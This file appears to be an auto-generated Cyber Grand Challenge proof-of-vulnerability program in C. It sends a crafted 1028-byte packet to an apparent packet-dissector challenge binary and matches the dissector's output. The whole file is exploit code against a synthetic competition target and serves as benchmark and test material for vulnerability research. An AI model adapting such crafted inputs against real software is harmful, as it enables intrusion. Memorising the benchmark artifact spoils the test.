#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x2d\x39\x53\x44"
         "\xc8\xf2\x22\xe3\x16\x4c\x59\xa7\x85\x00\x00\x00\xb6\x9d\xbc\xb3"
         "\xbe\x88\xbb\x55\x1b\x8b\xcf\x61\xa7\xd6\xd0\x6e\xf5\x70\x2f\x9b"
         "\xf1\x8c\xeb\x36\x4a\x27\xfb\xd9\x70\x86\x7d\x20\x83\x72\xb5\x8f"
         "\x16\xcb\x19\x70\x97\x9c\x5b\xfc\x2c\xb6\xb8\xd1\xbd\x7a\xba\x31"
         "\xef\x98\x47\xa2\x38\xd8\xd7\x8e\xca\x67\x62\x4f\xa1\x23\xf2\x29"
         "\xb5\xfc\xa7\xf8\xe1\xdb\x52\x55\xec\xfb\x3f\x41\x21\x68\xe0\xb6"
         "\x6e\x50\x05\x95\x1d\x3e\x20\xa5\x19\xa3\xf7\xe0\xae\x4c\xae\x06"
         "\xd3\x98\x77\x63\x13\x63\x1b\x19\x60\xc1\x21\x4c\x63\xff\x26\x3c"
         "\xe7\xae\x67\xc0\xa1\x5c\x10\x4f\xbd\x54\x19\x8e\xd9\xf8\x78\x9a"
         "\xe9\x2a\x21\x5e\xc6\xec\x4b\x61\xab\x2b\xb5\xe6\xb1\xa3\x16\x1e"
         "\xab\x92\x72\xd3\x64\x15\xdd\x87\xe3\x46\x2a\x04\x4f\x46\x71\x74"
         "\x5e\x07\xa8\xb0\x05\xf0\x7b\xfa\xb4\xa6\x1a\x15\x6f\xbb\xdf\x03"
         "\x42\x3f\x1e\xab\xdd\x0a\x48\x62\xb9\x3e\x09\xc8\xca\x26\xee\x2a"
         "\xd8\x66\xc7\x77\x4d\x9c\x69\x5c\x6f\x75\x0c\x9a\xe7\x2a\x0a\x82"
         "\x8a\xea\xaf\x5c\x5c\x50\x72\x52\xcb\xc7\xd4\x10\xfd\xfa\x9c\x8c"
         "\x70\xa8\x9f\x22\x38\xca\xed\x12\x1f\xf0\xba\xc0\x1e\x65\xc4\x9b"
         "\x9c\xd3\x1d\x3e\x78\x53\xd6\x33\xb8\x61\xcf\xed\xb1\x21\x8d\x98"
         "\x12\x47\xc2\x86\x2c\x64\xb5\x70\xec\x39\xc8\x99\x3b\xea\x46\x81"
         "\x21\x5e\xc2\x83\x91\x92\x92\x06\x91\xd3\xe6\xc4\x92\xf2\x74\x8a"
         "\xdf\x5f\x6c\xea\x1b\x84\x5b\x89\x1c\xd4\xca\x48\x59\x84\x70\x91"
         "\x3e\xe1\x86\xdd\x8d\xc0\x38\x72\x39\x96\xdb\xba\x9a\xc7\x50\x9b"
         "\x75\xd6\x99\x17\xfb\xa9\xde\x54\x69\x5e\x1e\x8d\x63\x49\x33\xe2"
         "\xa8\xda\x53\xdd\x89\xde\xcd\x6f\x84\x20\x98\x2d\xad\xf5\xb9\x3c"
         "\xdc\xe0\x8b\x77\x7d\xfc\xb6\xb6\xdf\x06\x2e\x0b\x62\x16\x23\x9a"
         "\xd9\x0b\x6d\xb1\xfe\x71\x98\x2f\x22\xa8\x9a\x1d\x05\x13\x63\xf8"
         "\x09\x64\xd0\x45\x7c\x7b\x95\x4f\x59\x7f\x21\x46\x00\x33\x78\x46"
         "\xb3\x82\x48\xa8\x66\x48\x5b\x34\x3f\x39\x5b\xe0\x7b\x4a\xf9\x2e"
         "\x7a\x1a\x09\xa3\x5b\xf8\x48\x94\xc7\x25\x55\x2e\xb8\x0a\xfa\x20"
         "\x00\xe0\x5c\x72\x9c\xb7\x8c\x89\xa3\x61\xd6\xa9\x8f\x5a\x4b\x8d"
         "\xb8\x87\x12\x9a\x26\xef\x8b\x3c\xf7\x00\x67\x27\x93\x01\xb1\xb5"
         "\xb8\x85\x73\x49\x97\x60\x77\xc9\xfa\x63\xb8\x68\x8d\xa6\xc0\x65"
         "\x60\x64\x5d\x54\xcb\x84\xfb\x5c\x44\xca\x86\x50\xee\x72\x84\x61"
         "\x3f\xe3\x26\xce\x20\xd8\x9b\x63\x78\x3b\xba\xac\x17\x6c\xc5\xba"
         "\x11\xd8\xe6\x10\x64\xc6\xa2\x97\x42\x7f\xe5\x5f\xbb\x10\x29\x37"
         "\x84\xe2\x4c\x6e\xe2\xea\x78\x71\x5c\x39\xd1\x1d\xf3\x40\x7b\x5f"
         "\xe5\x18\x5b\x07\x33\xf5\xb0\xbb\xd7\x23\x7f\xc2\x35\xc0\xfc\x05"
         "\x3f\x0a\xd9\x77\x80\x96\x16\x6a\x93\xc9\xeb\xd6\x71\xd3\xa7\xd8"
         "\x3f\x01\xcc\xfd\xde\x68\x54\xda\x8e\xbd\x82\x62\x2d\xee\xe7\x91"
         "\xf0\x8f\x74\x7a\xc3\x31\x84\xda\xef\x37\xe0\x06\x32\x8d\xa5\x8d"
         "\x4e\x5a\xf9\x5e\x42\x65\x82\x56\x99\x14\xe9\x80\x7d\xb4\x28\x8a"
         "\x83\xa6\x9a\x2a\x1c\xae\x2f\xb6\x31\x74\x8b\x83\x90\x60\x0c\x28"
         "\xfc\xf5\x05\x00\x4f\xfd\xbe\x87\x5e\x32\x05\x00\xca\x82\x5c\x81"
         "\x48\xc9\x9f\x4b\x64\xb5\xeb\x61\x42\x00\x8f\x31\x43\x0a\x5d\x7a"
         "\x3e\x99\xca\xad\x88\xef\x34\xca\x30\x00\xca\xf9\x78\xd7\xf4\x7a"
         "\x63\xad\xd4\xb6\x97\xef\x1f\x4d\xb1\x41\x42\x21\x08\x28\x33\x32"
         "\xfd\x50\x6e\xf0\x50\x45\x97\x0a\xf8\xa7\xf8\x1f\x6f\x94\x71\x94"
         "\xd9\xf1\x34\xdf\x40\x42\x22\xad\x8b\xec\x6b\xe1\x7f\xf3\xad\xc5"
         "\x78\x05\x13\x95\xcf\x1a\x4c\x1b\xf3\xee\x38\x31\xbc\x1f\x60\xb4"
         "\xe3\x25\xf7\x03\xfc\x4c\xb6\xa8\x40\xe7\x3f\x80\xa3\x5d\x0a\x3c"
         "\x1f\x6b\xab\xa4\x03\x93\x6c\x09\x55\x97\xbb\x74\xaa\xd6\x59\xe2"
         "\xd1\xd3\xd9\xe5\xcb\x28\x8b\xbf\xfb\xaf\x21\x4c\x51\x32\xe2\xe9"
         "\xaf\xc3\xa8\x78\x9b\xe8\xb1\xad\xe3\x4e\xdc\x3a\xac\xdf\xd8\x07"
         "\xaf\xa2\x40\xf9\xec\xb0\x12\x2e\x34\x93\x6c\x8b\xc3\xd4\x3d\x8e"
         "\xc7\x5b\xd6\xde\xe7\x51\xd2\xd2\xf7\xee\x6d\x8b\x7c\xf5\x23\xae"
         "\x48\xe3\x8c\x62\x32\xf8\x52\x05\x00\x05\x00\xf5\xc8\xc1\x30\x70"
         "\x4d\xb0\x23\x05\x00\x39\x99\xb2\x32\x65\xa7\x98\x80\xea\xe4\x37"
         "\x40\xb9\xde\xc0\x26\xc8\x7c\xa7\xad\x4c\x32\x41\xba\x8e\x12\x8a"
         "\x21\xf2\xf5\x5e\x07\x66\x91\xfc\x00\x6e\x5a\xac\x45\x41\xe7\xb4"
         "\xdc\xed\x5e\x05\x00\xd1\xba\xa2\x39\x24\xea\x64\x87\x5d\xe4\x4f"
         "\x34\xd9\xe3\x5e\xd4\x26\xd9\x8c\x62\xe8\xb2\x15\x65\xea\x0b\x6a"
         "\x32\xf0\x2a\xb6\x11\xc2\x53\x71\xaf\x6e\xca\x87\x19\x8c\x95\x45"
         "\xf0\x3e\x88\x71\x23\x27\x07\x5a\xc2\xca\x49\xc3\xac\x31\xd4\x10"
         "\x26\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===countryfolkintolerance
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x63\x6f\x75\x6e\x74\x72\x79\x66\x6f\x6c\x6b"
         "\x69\x6e\x74\x6f\x6c\x65\x72\x61\x6e\x63\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
